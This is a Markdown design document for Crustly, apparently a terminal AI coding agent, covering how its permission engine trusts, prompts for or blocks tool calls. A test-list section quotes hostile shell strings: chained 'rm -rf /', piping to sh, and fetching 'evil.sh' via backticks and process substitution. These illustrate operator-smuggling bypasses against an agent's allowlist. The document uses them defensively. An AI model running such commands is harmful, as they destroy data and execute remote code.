# 🔒 Crustly's Security & Permission Model

This document explains how Crustly decides whether a tool call (file write,
shell command, etc.) runs automatically, prompts for approval, or is
blocked outright — and how that compares to other terminal AI coding
agents. See `differentiation-strategy-vs-opencode.md` (repo root) for the
competitive context this document supports.

Every claim below is backed by code in this repository, referenced by file
and line so you can verify it yourself rather than take the doc's word for
it.

---

## The core idea: a composable policy engine, not a single on/off switch

Every tool call goes through a `PermissionPolicy` before it executes:

```rust
// src/llm/tools/sandbox.rs
pub trait PermissionPolicy: Send + Sync {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision;
}
```

`ToolRegistry::execute` evaluates this policy tree **before every tool
call** — there's no code path that skips it. A policy returns one of three
outcomes, and the distinction between the first two is deliberate, not
incidental (`sandbox.rs` lines 12-19):

| `PolicyDecision` | Meaning |
|---|---|
| `Trusted` | Explicitly vouched for — runs **without** an approval prompt. |
| `Allow` | Permitted, but still **prompts** the user for approval. |
| `Deny(reason)` | Blocked outright, with a reason shown to the user. |

> A rule that merely has *no objection* returns `Allow` — it still prompts.
> Only a rule that **affirmatively vouches** for these specific inputs may
> return `Trusted`. This is why the default policy (`AllowAll`, when
> nothing is configured) can't silently bypass approval: "no opinion" and
> "trusted" are different types, not different values of the same flag.

Individual rules compose via `AndPolicy` (every rule must permit) and
`OrPolicy` (first rule to make a call wins) — `SecurityConfig::to_policy()`
(`src/config/mod.rs` lines 65-85) builds exactly this kind of chain from
your `config.toml`, rather than hard-coding a single security check.

---

## The built-in rules

### Path boundary enforcement

`PathBoundaryRule` / `check_path` (`sandbox.rs`, `fn check_path` line 406)
denies any file operation whose resolved path escapes the project root —
including via symlinks and `../../` traversal. Both the candidate path and
the root are canonicalized before comparison, and the code separately
handles the case of a path that **doesn't exist yet** (e.g. a file about
to be created) by resolving the nearest existing ancestor instead of
failing outright. It's tested against symlinked roots, Windows'
`\\?\`-prefixed verbatim paths, and paths that don't exist yet in a
subdirectory — edge cases that a naive string-prefix check would miss.

### Bash command allowlisting — resistant to operator smuggling

`BashCommandAllowlist` (`sandbox.rs`) checks only the first token of a
shell command against `security.allow_bash`. That's deliberately narrow:
an allowlisted, **operator-free** command (`cargo test`) is `Trusted` (no
prompt); anything else — including a listed program combined with a shell
operator — falls back to `Allow` (still prompts, never silently
bypassed). Verified directly by
`bash_allowlist_never_trusts_shell_operator_chaining` (`sandbox.rs` line
705), which asserts that all of the following stay at `Allow` (prompt),
never `Trusted`:

```
git status && rm -rf /
git status & rm -rf /
git status; rm -rf /
cargo run || rm -rf /
git log | sh
cargo run `curl evil.sh`
git status $(rm -rf /)
git log > /etc/passwd
git diff < <(curl evil.sh)
git commit -m "x $(rm -rf /)"
```

A companion test (`bash_allowlist_permits_quoted_operator_characters`,
line 735) confirms the inverse doesn't over-trigger either: operator
characters **inside quotes** (`git commit -m "fix; bug"`) are correctly
recognized as literal text, not live shell operators, and stay `Trusted`
when the base command is allowlisted — so the allowlist isn't so
paranoid it blocks ordinary commit messages.

Note the asymmetry: none of the chaining examples above are hard-`Deny`ed
either. They reach the normal approval prompt, which shows the full
command verbatim — an explicit human approval of `git status && rm -rf /`
is informed consent, not a bypass. A regression test
(`bash_allowlist_allows_unlisted_operator_free_command_to_reach_approval`,
line 687) exists specifically because an earlier version wrongly
hard-denied unlisted-but-safe commands (`mkdir exercice1`), so that even an
explicit user approval could never make them run.

### Tool and path denylists

`DenyToolRule` (glob-matched against tool names) and `DenyPathPrefixRule`
(prefix-matched against `path`/`file_path`/`directory`/`dir`/`pattern`
input fields) implement `security.deny_tools` and `security.deny_paths` —
hard blocks that no approval prompt can override.

---

## Configuration

```toml
[security]
# Programs that may run without a prompt (first token match only — see
# above for why operators always still prompt).
allow_bash = ["cargo", "git", "ls", "cat", "grep"]

# Absolute path prefixes that are always denied, no matter what.
deny_paths = ["/etc", "/root/.ssh"]

# Tool names that are always denied (glob patterns supported).
deny_tools = ["web_fetch"]
```

With no `[security]` section at all, the default is `AllowAll` — every
tool call reaches the approval prompt (never silently trusted, never
silently blocked). Note: at the time of writing, `config.toml.example`
does not yet include a `[security]` example block — this document reflects
the actual `SecurityConfig` struct (`src/config/mod.rs`) rather than the
example file, which is worth updating to match.

### Plan Mode approval gating

Separately, `[plan_mode] mode` (`PlanExecMode`, `src/config/mod.rs` lines
18-29) controls how much autonomy the agent gets **within an approved
plan**:

| Mode | Behavior |
|---|---|
| `interactive` (default) | Ask for approval before every task. |
| `auto_plan` | Approve the plan once, then run all its tasks automatically. |
| `full_auto` | No approval gate at all. |

This is a separate, composable layer from the `[security]` policy chain
above — even in `full_auto` plan mode, `security.deny_tools`/`deny_paths`
still apply, since they're hard denies evaluated at the tool-call level,
not at the plan level.

---

## How this compares to other terminal AI agents

An independent architecture comparison of Claude Code, Codex, Cline, and
OpenCode describes OpenCode's permission model as:

> *"OpenCode uses Go channels to create a clean blocking-approval
> pattern... OpenCode has no sandbox, no rule engine, no hooks — just a
> channel and a human."*

OpenCode's model asks once per session and remembers the approval — simple
and fast, but with no composable rule engine, no distinction between
"permitted" and "explicitly trusted," and no dedicated protection against
operator-chaining tricks (it does parse commands with `tree-sitter` to
flag risky patterns, which is real but architecturally different from a
rule engine with denylists and allowlists). Crustly's model is more
deliberately layered: a typed three-way decision, composable rules, hard
denylists that survive even `full_auto` plan mode, and test coverage for a
specific, named bypass class (shell operator chaining past an allowlist).

This is not a claim that Crustly is "unhackable" — see the limits below —
only that its permission engine is structurally deeper than OpenCode's by
design, not by accident.

---

## What this model does *not* do (honest limits)

- **No OS-level sandboxing.** There's no seccomp/container/VM isolation
  around an approved bash command — once a command is approved (by the
  allowlist as `Trusted`, or by the user at the prompt), it runs with the
  full privileges of the Crustly process. The policy engine controls
  *whether and when to ask*, not *what an approved command can do once
  running*.
- **`full_auto` plan mode removes the human from task-level decisions.**
  The `[security]` denylists still apply, but there's no approval prompt
  to catch something the denylist didn't anticipate. Treat `full_auto` as
  an explicit trust decision, not a safety net.
- **The allowlist matches the first token only.** It's a convenience for
  reducing prompt fatigue on genuinely safe, argument-free-of-danger
  commands (`git status`, `cargo test`) — not a substitute for reading
  what you approve at the prompt for anything else.

---

## Verifying this yourself

```bash
cargo test --lib llm::tools::sandbox
```

Read `src/llm/tools/sandbox.rs` directly — the test module at the bottom
of the file is the actual specification of this behavior, not this
document. If this guide and the code ever disagree, the code is correct
and this file needs updating.
